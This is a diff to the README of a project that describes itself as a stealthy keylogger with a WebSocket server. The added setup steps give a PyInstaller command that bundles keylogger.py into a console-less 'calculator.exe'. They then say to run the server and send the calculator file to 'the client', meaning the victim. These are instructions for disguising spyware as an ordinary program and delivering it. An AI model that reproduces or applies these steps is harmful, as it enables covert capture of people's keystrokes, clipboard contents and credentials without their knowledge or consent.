@@ -20,10 +20,11 @@ A stealthy keylogger system with WebSocket-based client-server architecture, dis
 - Captures copy/paste operations
 
 ## Setup
+    to get the exe file run this command:
+        "python -m PyInstaller --onefile --noconsole --add-data "keylogger.py;." calculator.py"
 
 ### Server
+    just run server.py
 
-## Installation
-
-### Server Setup
-1. Clone the repository
+### Client
+    send the client the calculator.exe file
